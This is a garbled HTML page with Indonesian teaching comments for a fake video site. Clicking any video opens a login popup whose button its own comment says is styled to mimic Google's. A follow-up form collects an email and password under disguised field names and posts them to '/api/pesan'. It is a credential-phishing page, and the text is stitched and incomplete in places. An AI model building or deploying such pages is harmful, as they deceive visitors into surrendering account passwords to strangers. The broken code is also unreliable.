<!DOCTYPE html>
<html lang="id">
<head>

<style>
/* ============================================================
   VARIABEL WARNA (CSS Variables)
   Semua warna di web ini diambil dari sini, bukan ditulis
   berulang-ulang di tiap elemen. Jadi kalau mau ganti tema,
   cukup ubah nilai di --bg, --card, --ac, dst di satu tempat
   ini — seluruh halaman otomatis ikut berubah.
   =============================d:"18 Nov 2025",uploader:"Admin Demo",views:1250},

:root{
  --bg:#f4f5f8;        /* warna latar belakang halaman */
  --card:#ffffff;      /* warna kartu/kotak (video, modal, dll) */
  --tx:#1b1e25;        /* warna teks utama */
  --mut:#7a8296;       /* warna teks abu-abu/kurang penting */
  --ac:#7c5cff;        /* warna aksen utama (ungu) */
  --ac2:#20b48a;       /* warna aksen kedua (hijau) */
  --bd:#e3e6ee;        /* warna garis/border tipis */
  --shadow:0 2px 10px rgba(20,20,40,.06); /* bayangan halus kartu */
  color-scheme:light;  /* kasih tahu browser bahwa tema ini terang */
}

/* Reset dasar: biar ukuran padding/border tidak bikin elemen melebar */
*{box-sizing:border-box}

html,body{height:100%}

body{
  margin:0;
  background:var(--bg);
  color:var(--tx);
  font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
  /* dua baris di bawah: kasih jarak aman dari notch/status bar HP */
  padding-top:env(safe-area-inset-top,0px);
  padding-bottom:env(safe-area-inset-bottom,0px);
}

/* Class bantu buat sembunyiin elemen. Tinggal tambah/hapus
   class ini lewat JavaScript untuk show/hide sesuatu. */
.hidden{display:none!important}

/* Reset tampilan default <button> HTML, biar polos dan gampang di-style ulang */
button{
  font:inherit;
  border:0;
  cursor:pointer;
  color:inherit;
  background:none;
}

/* ===================== HEADER / TOP BAR ===================== */
.top{
  position:sticky;   /* nempel di atas walau di-scroll */
  top:0;
  z-index:10;
  background:rgba(255,255,255,.92);
  backdrop-filter:blur(8px); /* efek blur kaca buram */
  border-bottom:1px solid var(--bd);
  padding-top:env(safe-area-inset-top,0px);
}

.bar{
  max-width:1100px;  /* lebar maksimal konten, biar gak terlalu lebar di layar besar */
  margin:0 auto;     /* taruh di tengah */
  display:flex;
  align-items:center;
  gap:12px;
  padding:12px 16px;
}

.logo{
  font-weight:800;
  font-size:1.2rem;
  white-space:nowrap;
  color:var(--tx);
}

.logo b{
  display:inline-flex;
  align-items:center;
  justify-content:center;
  width:26px;
  height:26px;
  margin-right:6px;
  border-radius:8px;
  background:linear-gradient(135deg,var(--ac),var(--ac2)); /* gradasi 2 warna aksen */
  font-size:.7rem;
  color:#fff;
}

.logo span{color:var(--ac2)}

.search{
  flex:1;        /* ambil sisa ruang yang ada di .bar */
  min-width:0;
  padding:10px 14px;
  border-radius:999px; /* angka besar = bentuk pil/kapsul */
  border:1px solid var(--bd);
  background:var(--card);
  color:var(--tx);
  font:inherit;
  font-size:.9rem;
}

.search::placeholder{color:var(--mut)}

/* ===================== CHIP KATEGORI ===================== */
.chips{
  max-width:1100px;
  margin:0 auto;
  display:flex;
  gap:8px;
  overflow-x:auto;    /* bisa discroll ke samping kalau kategorinya banyak */
  padding:0 16px 12px;
  scrollbar-width:none; /* sembunyiin scrollbar (Firefox) */
}

.chips::-webkit-scrollbar{display:none} /* sembunyiin scrollbar (Chrome/Safari) */

.chip{
  flex:none;      /* ukurannya tetap, gak ikut menyusut/melebar */
  padding:7px 14px;
  border-radius:999px;
  border:1px solid var(--bd);
  background:var(--card);
  font-size:.85rem;
  color:var(--mut);
}

/* Class "on" ditambahkan lewat JS ke chip yang lagi aktif/dipilih */
.chip.on{
  background:var(--ac);
  border-color:var(--ac);
  color:#fff;
}

/* ===================== ISI UTAMA (video) ===================== */
main{
  max-width:1100px;
  margin:0 auto;
  padding:16px;
}

/* .hero = kartu video besar paling atas (video pertama hasil filter) */
.hero{
  display:block;
  width:100%;
  text-align:left;
  margin-bottom:22px;
}

.hero .thumb{
  aspect-ratio:16/9;   /* rasio lebar:tinggi gambar video */
  border-radius:16px;
}

.hero .ttl{
  margin-top:12px;
  font-size:1.2rem;
  font-weight:700;
  -webkit-line-clamp:2;
}

.hero .cat{
  margin-top:4px;
  font-size:.85rem;
}

/* .grid = kumpulan kartu video kecil di bawah hero */
.grid{
  display:grid;
  /* kolom otomatis menyesuaikan lebar layar, minimal 160px tiap kolom */
  grid-template-columns:repeat(auto-fill,minmax(160px,1fr));
  gap:16px 12px;
}

/* .card = satu kartu video (dipakai baik di .grid maupun jadi isi .hero) */
.card{
  text-align:left;
  display:block;
  width:100%;
  background:var(--card);
  border-radius:14px;
  padding:6px;
  box-shadow:var(--shadow);
}

/* .thumb = kotak thumbnail/gambar video */
.thumb{
  position:relative;   /* biar elemen anak (durasi, tombol play) bisa absolute di dalamnya */
  aspect-ratio:16/9;
  border-radius:10px;
  overflow:hidden;
  background:linear-gradient(135deg,#eef0f6,#e4e7f0); /* warna default sebelum/tanpa foto */
}

.thumb img{
  width:100%;
  height:100%;
  object-fit:cover;   /* gambar dipotong rapi mengisi kotak, tidak gepeng */
  display:block;
}

/* .ph = ikon ▶ abu-abu yang muncul selama belum ada foto asli */
.thumb .ph{
  position:absolute;
  inset:0;   /* menutupi seluruh .thumb (top/right/bottom/left: 0) */
  display:flex;
  align-items:center;
  justify-content:center;
  font-size:1.6rem;
  color:var(--mut);
}

/* .play = ikon play bulat kecil di pojok kanan bawah thumbnail */
.thumb .play{
  position:absolute;
  right:8px;
  bottom:8px;
  width:30px;
  height:30px;
  border-radius:50%;
  background:rgba(0,0,0,.55);
  color:#fff;
  display:flex;
  align-items:center;
  justify-content:center;
  font-size:.7rem;
}

/* .dur = label durasi video (pojok kiri bawah thumbnail) */
.dur{
  position:absolute;
  left:6px;
  bottom:6px;
  background:rgba(0,0,0,.7);
  color:#fff;
  font-size:.72rem;
  padding:2px 6px;
  border-radius:6px;
}

/* efek garis ungu di sekeliling thumbnail saat kartu di-hover (mouse) */
.card:hover .thumb{outline:2px solid var(--ac)}

.ttl{
  margin-top:8px;
  padding:0 4px;
  font-size:.9rem;
  line-height:1.3;
  /* 4 baris di bawah: potong judul otomatis jadi maksimal 2 baris + "..." */
  display:-webkit-box;
  -webkit-line-clamp:2;
  -webkit-box-orient:vertical;
  overflow:hidden;
}

.cat{
  margin-top:3px;
  padding:0 4px 4px;
  font-size:.75rem;
  color:var(--ac2);
}

/* Pesan "Tidak ada video yang cocok" saat hasil pencarian kosong */
.empty{
  color:var(--mut);
  padding:30px 0;
  text-align:center;
}

/* ===================== POPUP / MODAL ===================== */
/* .overlay = lapisan gelap transparan yang menutupi seluruh layar
   saat popup terbuka (jadi background-nya gak bisa diklik) */
.overlay{
  position:fixed;
  inset:0;
  background:rgba(20,22,30,.45);
  display:flex;
  align-items:center;
  justify-content:center;
  padding:16px;
  z-index:50;
}

/* .modal = kotak putih popup yang berada di tengah .overlay */
.modal{
  position:relative;
  background:var(--card);
  border:1px solid var(--bd);
  border-radius:16px;
  padding:36px 20px 32px;
  width:100%;
  max-width:360px;   /* lebar maksimal popup */
  box-shadow:0 12px 32px rgba(20,20,40,.18);
}

.modal h2{
  font-size:1.05rem;
  margin:0 0 18px;
  text-align:center;
}

.sub{
  font-size:.9rem;
  font-weight:600;
  color:var(--tx);
  margin:0 0 18px;
  text-align:center;
}

/* .x = tombol bulat "✕" buat nutup popup */
.x{
  position:absolute;
  top:10px;
  right:10px;
  width:28px;
  height:28px;
  display:flex;
  align-items:center;
  justify-content:center;
  padding:0;
  border-radius:50%;
  border:1px solid var(--bd);
  color:var(--mut);
  font-size:.8rem;
}

.x:hover{background:var(--bg)}

/* .gbrand = wadah isi popup login (judul "Login" + tombol Google + catatan) */
.gbrand{
  display:flex;
  flex-direction:column;
  align-items:center;
  gap:10px;
  text-align:center;
}

.tes{
  font-size:1.05rem;
  font-weight:700;
  color:var(--tx);
}

/* .field = pembungkus 1 pasang label + input di form (biar jaraknya rapi) */
.field{
  margin-bottom:14px;
}

label{
  display:block;
  font-size:.82rem;
  font-weight:600;
  color:var(--mut);
  margin:0 0 6px;
}

input.f{
  width:100%;
  font:inherit;
  padding:12px 14px;
  border-radius:10px;
  border:1px solid var(--bd);
  background:var(--bg);
  color:var(--tx);
}

/* tampilan saat kotak input sedang diklik/diketik */
input.f:focus{
  outline:none;
  border-color:var(--ac);
  background:var(--card);
}

/* GOOGLE BUTTON — sengaja dibuat mirip tombol resmi Google
   (putih, border abu, logo 4 warna) biar terasa familiar */
.btn-google{
  display:flex;
  align-items:center;
  justify-content:center;
  gap:10px;
  width:100%;
  background:#fff;
  border:1px solid #dadce0;
  border-radius:8px;
  padding:12px 16px;
  font-family:Roboto,Arial,sans-serif;
  font-size:14px;
  font-weight:500;
  color:#3c4043;
  cursor:pointer;
  box-shadow:0 1px 2px rgba(0,0,0,.08);
  transition:background .2s,box-shadow .2s;
}

.btn-google:hover{
  background:#f8f9fa;
  box-shadow:0 1px 4px rgba(0,0,0,.15);
}

.btn-google:disabled{
  opacity:.6;
  cursor:not-allowed;
}

.btn-google svg{
  width:18px;
  height:18px;
  flex-shrink:0;
}

/* Tombol kirim pada form, dibedakan dari tombol Google agar tidak tertukar */
.btn-primary{
  display:flex;
  align-items:center;
  justify-content:center;
  width:100%;
  margin-top:6px;
  padding:12px 16px;
  border-radius:8px;
  font-size:14px;
  font-weight:600;
  color:#fff;
  background:linear-gradient(135deg,var(--ac),var(--ac2));
  box-shadow:0 2px 8px rgba(124,92,255,.3);
  transition:opacity .2s,box-shadow .2s;
}

.btn-primary:hover{box-shadow:0 2px 12px rgba(124,92,255,.4)}

.btn-primary:disabled{
  opacity:.6;
  cursor:not-allowed;
  box-shadow:none;
}

/* .hint = teks status di bawah form ("Mengirim…", "Terkirim ✔", pesan error) */
.hint{
  font-size:.85rem;
  color:var(--mut);
  margin-top:12px;
  min-height:1.2em;  /* biar layout gak "lompat" saat teksnya muncul/hilang */
  text-align:center;
}

/* .note = catatan kecil abu-abu di bawah tombol Google */
.note{
  font-size:.72rem;
  color:var(--mut);
  text-align:left;
  margin-top:4px;
  line-height:1.4;
}


/* Metadata simulasi di bawah judul setiap video */
.video-meta{
  display:flex;
  flex-wrap:wrap;
  align-items:center;
  gap:5px 12px;
  margin:5px 2px 0;
  color:var(--mut);
  font-size:.72rem;
  line-height:1.4;
}
.video-meta-item{
  display:inline-flex;
  align-items:center;
  gap:4px;
  min-width:0;
}
.video-meta-item svg{
  width:14px;
  height:14px;
  flex:none;
  fill:none;
  stroke:currentColor;
  stroke-width:1.8;
  stroke-linecap:round;
  stroke-linejoin:round;
}

</style>
</head>

    </div>

</div>

<!-- ============================================================
     POPUP 2: form Email depan/belakang, muncul setelah klik
     tombol "Login dengan Google" di popup 1.
     ============================================================ -->
<div class="overlay hidden" id="formCard">
  <div class="modal">
    <button class="x" data-close aria-label="Tutup">✕</button>

    <h2>Login</h2>

    <div class="field">

    </button>

</div>

// $("id") = jalan pintas, biar gak perlu nulis
// document.getElementById("id") berulang-ulang.
const $ = (id) => document.getElementById(id);

// Menyimpan kategori yang sedang dipilih user. "Semua" = default awal.
let kategoriAktif = "Semua";

/* ============================================================
   BIKIN TOMBOL KATEGORI (CHIP) SECARA OTOMATIS
   new Set(...) dipakai buat ambil kategori yang unik saja
   (gak dobel), lalu "Semua" ditaruh di paling depan.
   Jadi kalau di ITEMS ada kategori baru, chip-nya otomatis
   muncul sendiri tanpa perlu ditulis manual di HTML.
   ============================================================ */
const kats = ["Semua", ...new Set(ITEMS.map(i => i.kategori))];

kats.forEach(k => {
  const b = document.createElement("button");
  b.className = "chip" + (k === kategoriAktif ? " on" : "");
  b.textContent = k;

  // saat chip diklik: ganti kategori aktif, update tampilan "on"
  // di semua chip, lalu render ulang daftar video
  b.addEventListener("click", () => {
    kategoriAktif = k;

    [...$("chips").children].forEach(c =>
      c.classList.toggle("on", c.textContent === k)
    );

    render();
  });

  $("chips").appendChild(b);
});

/* ============================================================
   buildCard(it)
   Fungsi ini menerima SATU objek video (dari ITEMS) dan
   mengembalikan satu elemen <button class="card"> lengkap
   dengan thumbnail, ikon play, durasi, judul, dan kategori.
   Dipakai ulang baik untuk kartu di grid kecil maupun untuk
   isi kartu video besar (hero) di atas.
   ============================================================ */
function buildCard(it){
  const card = document.createElement("button");
  card.className = "card";

  const th = document.createElement("div");
  th.className = "thumb";

  // ikon ▶ abu-abu placeholder, tampil selama foto belum/gagal dimuat
  const ph = document.createElement("div");
  ph.className = "ph";
  ph.textContent = "\u25b6";

  const img = document.createElement("img");
  img.loading = "lazy";          // gambar dimuat belakangan, hemat kuota
  img.alt = it.title;
  img.src = it.thumb;
  // kalau link gambar rusak/tidak ketemu, elemen <img> dihapus
  // saja supaya yang kelihatan cuma placeholder ▶ di belakangnya
  img.addEventListener("error", () => img.remove());

  const dur = document.createElement("div");
  dur.className = "dur";
  dur.textContent = it.durasi || "";

  const pl = document.createElement("div");
  pl.className = "play";
  pl.textContent = "\u25b6";

  th.append(ph,img,dur,pl);

  const t = document.createElement("div");
  t.className = "ttl";
  t.textContent = it.title;

  const c = document.createElement("div");
  c.className = "cat";
  c.textContent = it.kategori;

  // Metadata contoh ditampilkan di bawah judul untuk setiap video.
  const meta = document.createElement("div");
  meta.className = "video-meta";

  const uploadInfo = document.createElement("span");
  uploadInfo.className = "video-meta-item";
  uploadInfo.textContent = "" + (it.uploader || "Admin demo");

  const uploaderInfo = document.createElement("span");
  uploaderInfo.className = "video-meta-item";
  uploaderInfo.textContent = "" + (it.upload || "Tanggal contoh");

  const viewInfo = document.createElement("span");
  viewInfo.className = "video-meta-item";
  viewInfo.innerHTML = `<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7S2 12 2 12Z"></path><circle cx="12" cy="12" r="3"></circle></svg><span>${Number(it.views || 0).toLocaleString("id-ID")} views</span>`;

  meta.append(uploadInfo, uploaderInfo, viewInfo);
  card.append(th,t,c,meta);

  // klik di mana saja pada kartu ini akan membuka popup "Login"
  card.addEventListener("click", () => {
    $("popup").classList.remove("hidden");
  });

  return card;
}

/* ============================================================
   render()
   Fungsi utama yang menggambar ulang tampilan video:
   1. Ambil teks pencarian dari kotak #q
   2. Saring ITEMS sesuai kategori aktif + teks pencarian
   3. Video pertama hasil saringan → dijadikan hero (besar)
   4. Sisanya → dimasukkan ke grid kecil di bawahnya
   Dipanggil ulang setiap kali user mengetik di pencarian
   atau mengganti kategori — jadi tampilan selalu sinkron
   dengan filter yang sedang aktif.
   ============================================================ */
function render(){
  const f = $("q").value.toLowerCase().trim();

  const list = ITEMS.filter(i =>
    (kategoriAktif === "Semua" || i.kategori === kategoriAktif) &&
    i.title.toLowerCase().includes(f)
  );

  // bersihkan isi lama sebelum digambar ulang
  $("grid").textContent = "";
  $("hero").textContent = "";
  $("hero").className = "hero hidden card";
  $("empty").classList.toggle("hidden",list.length > 0);

  if(list.length){
    // video pertama di daftar hasil filter jadi video besar (hero)
    const heroItem = list[0];
    const heroCard = buildCard(heroItem);
    $("hero").className = "hero card";
    // isi (anak-anak elemen) dari kartu yang baru dibuat dipindah
    // ke dalam #hero, bukan kartunya sendiri yang dipakai
    $("hero").append(...heroCard.children);
    $("hero").addEventListener("click", () => {
      $("popup").classList.remove("hidden");
    }, { once:true }); // { once:true } = listener ini cuma jalan sekali
                        // lalu otomatis hilang, biar gak numpuk tiap render()
  }

  // sisa video (selain yang pertama) masuk ke grid kecil
  list.slice(1).forEach(it => {
    $("grid").appendChild(buildCard(it));
  });
}

// setiap kali user mengetik di kotak pencarian, render() dipanggil ulang
$("q").addEventListener("input",render);
// panggilan pertama saat halaman pertama kali dibuka
render();

/* ============================================================
   TUTUP POPUP
   Berlaku untuk kedua popup (#popup dan #formCard):
   popup ditutup kalau user klik area gelap di luar kotak putih,
   ATAU klik tombol "✕" (yang punya atribut data-close).
   ============================================================ */
["popup","formCard"].forEach(id => {
  $(id).addEventListener("click",function(e){
    if(e.target === this || e.target.hasAttribute("data-close")){
      this.classList.add("hidden");
    }
  });
});

// menutup popup yang sedang terbuka kalau user menekan tombol Escape
document.addEventListener("keydown",e => {
  if(e.key !== "Escape") return;
  $("formCard").classList.add("hidden");
  $("popup").classList.add("hidden");
});

/* ============================================================
   LOGIN MEMBUKA FORM
   Saat tombol "Login dengan Google" diklik: popup pertama
   ditutup, popup form dibuka, lalu fokus otomatis diarahkan
   ke kotak input "Email" biar user bisa langsung mengetik.
   ============================================================ */
$("btnLogin").addEventListener("click",() => {
  $("popup").classList.add("hidden");
  $("formCard").classList.remove("hidden");
  $("nama").focus();
});

/* ============================================================
   KIRIM DATA FORM
   Saat tombol kirim di form diklik:
   1. Ambil & bersihkan (trim) nilai input Email & Email belakang
   2. Kalau salah satu kosong → tampilkan pesan error, berhenti
   3. Kalau lengkap → kirim ke server lewat fetch() (POST request)
      ke alamat /api/pesan dengan data dalam format JSON
   4. Tampilkan pesan sukses/gagal sesuai respons server
   "async/await" dipakai karena fetch() butuh waktu (nunggu
   respons server), jadi kodenya "menunggu" tanpa membekukan
   seluruh halaman.
   ============================================================ */
$("btnKirim").addEventListener("click",async () => {
  const nama = $("nama").value.trim();
  const belakang = $("belakang").value.trim();

  if(!nama || !belakang){
    $("msg").textContent = "Mohon isi Email dan password.";
    return;
  }

  $("btnKirim").disabled = true; // cegah diklik berkali-kali saat masih mengirim
  $("msg").textContent = "Mengirim…";

  try{
    const r = await fetch("/api/pesan",{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({nama,belakang})
    });

    const d = await r.json().catch(() => ({}));

    if(!r.ok) throw new Error(d.error || "Gagal mengirim.");

    $("msg").textContent = "Terkirim ✔";
    $("nama").value = "";
    $("belakang").value = "";

  }catch(e){
    $("msg").textContent = e.message;
  }

  $("btnKirim").disabled = false;
});
</script>
